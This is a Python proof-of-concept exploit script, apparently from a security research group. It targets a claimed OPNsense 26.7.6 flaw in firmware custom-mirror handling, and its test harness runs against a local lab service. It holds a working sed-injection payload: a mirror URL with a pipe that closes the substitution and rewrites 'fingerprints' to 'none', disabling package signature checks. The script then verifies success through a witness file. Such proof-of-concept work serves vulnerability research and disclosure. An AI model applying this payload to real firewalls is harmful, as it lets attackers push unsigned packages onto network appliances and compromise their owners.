#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: opnsense-firmware-mirror-sed (High: 7.2)
#  Vendor: OPNsense (Deciso B.V.)
#  Versions: OPNsense core 26.7.6 (a842fe48)
#  Impact: Custom firmware mirror sed-skips pkg fingerprints
#  Requires: page-system-firmware-manualupdate
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "opnsense-firmware-mirror-sed"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove OPNsense 26.7.6 firmware custom-mirror sed can skip pkg fingerprints."""


import json
import os
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

LABEL = "opnsense-firmware-mirror-sed"
WITNESS = "OPNSENSE-FIRMWARE-MIRROR-SED-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18860
PIN_TAG = "26.7.6"
PIN_SHA = "a842fe48c21288d11a422cb944678e8eb308becf"
# Hunt shape plus `|` so s||| closes and the second substitute runs.
ATTACK_MIRROR = 'https://example.invalid/|;/signature_type/s/"fingerprints"/"none"/;#'
CONTROL_MIRROR = "https://pkg.opnsense.org"
ORACLE_PATH = HERE / "oracle" / "secret"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def http_json(method: str, path: str, payload: dict[str, Any] | None = None) -> dict[str, Any]:
    url = f"http://{HOST}:{PORT}{path}"
    body = None if payload is None else json.dumps(payload).encode("utf-8")
    headers = {"Accept": "application/json"}
    if body is not None:
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=8.0) as resp:
            raw = resp.read().decode("utf-8")
            status = resp.status
    except urllib.error.HTTPError as err:
        raw = err.read().decode("utf-8", "replace")
        raise RuntimeError(f"{path} http={err.code} body={raw[:240]}") from err
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise RuntimeError(f"{path} {exc}") from exc
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"{path} not-json http={status}") from exc
    if not isinstance(data, dict):
        raise RuntimeError(f"{path} not-object")
    return data


def run_case(name: str, mirror: str) -> dict[str, Any]:
    data = http_json("POST", "/case", {"name": name, "mirror": mirror})
    log(
        f"ioc case={name} keeps_pipe={int(bool(data.get('keeps_pipe')))} "
        f"signature_type={data.get('signature_type')!r} url={data.get('url')!r} "
        f"plugins_discarded={int(bool(data.get('plugins_discarded')))} "
        f"sed_ok={int(bool(data.get('sed_ok')))} "
        f"witness_written={int(bool(data.get('witness_written')))}"
    )
    sanitized = data.get("sanitized")
    if isinstance(sanitized, str):
        log(f"ioc case={name} sanitized={sanitized}")
    conf = data.get("conf")
    if isinstance(conf, str):
        for line in conf.splitlines():
            log(f"ioc case={name} conf {line}")
    return data


def oracle_text() -> str:
    if not ORACLE_PATH.is_file():
        return ""
    return ORACLE_PATH.read_text(encoding="utf-8")


def main() -> int:
    log(f"label={LABEL} url=http://{HOST}:{PORT} pin={PIN_TAG} sha={PIN_SHA}")
    log(f"attack={ATTACK_MIRROR}")
    log(f"control={CONTROL_MIRROR}")

    try:
        ping = http_json("GET", "/ping")
    except RuntimeError as exc:
        return fail(f"ping {exc}")
    if ping.get("pong") != "pong":
        return fail("ping-no-pong")
    if ping.get("pin") != PIN_TAG:
        return fail(f"ping-pin={ping.get('pin')}")
    if ping.get("sha") != PIN_SHA:
        return fail(f"ping-sha={ping.get('sha')}")
    log(f"ioc php={ping.get('php')} filter={ping.get('filter')} sed={ping.get('sed')}")

    try:
        control = run_case("control", CONTROL_MIRROR)
        attack = run_case("attack", ATTACK_MIRROR)
    except RuntimeError as exc:
        return fail(str(exc))

    if control.get("pin") != PIN_TAG or attack.get("pin") != PIN_TAG:
        return fail("pin-mismatch")
    if not control.get("sed_ok") or not attack.get("sed_ok"):
        return fail("sed-failed")
    if not attack.get("plugins_discarded"):
        return fail("plugins-not-discarded")

    attack_sanitized = attack.get("sanitized")
    if not isinstance(attack_sanitized, str) or "|" not in attack_sanitized:
        return fail("sanitize-dropped-pipe")
    if "#" not in attack_sanitized or '"' not in attack_sanitized:
        return fail("sanitize-dropped-sed-meta")
    if not attack.get("keeps_pipe"):
        return fail("keeps-pipe-false")

    if control.get("signature_type") != "fingerprints":
        return fail(f"control-signature_type={control.get('signature_type')}")
    control_url = str(control.get("url", ""))
    if "pkg.opnsense.org" not in control_url:
        return fail("control-url-missing")
    if control.get("witness_written"):
        return fail("control-wrote-witness")

    if attack.get("signature_type") != "none":
        return fail(f"attack-signature_type={attack.get('signature_type')}")
    attack_url = str(attack.get("url", ""))
    if "example.invalid" not in attack_url:
        return fail("attack-url-not-rewritten")
    if "fingerprints" in attack_url and attack.get("signature_type") != "none":
        return fail("attack-url-still-fingerprints")
    if not attack.get("witness_written"):
        return fail("oracle-not-written")

    secret = oracle_text().strip()
    log(f"ioc oracle={secret!r}")
    if secret != WITNESS:
        return fail(f"oracle-mismatch={secret!r}")

    log(
        "SUCCESS "
        f"{LABEL} sanitize-keeps-pipe=yes signature_type=none "
        f"fingerprints-control=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

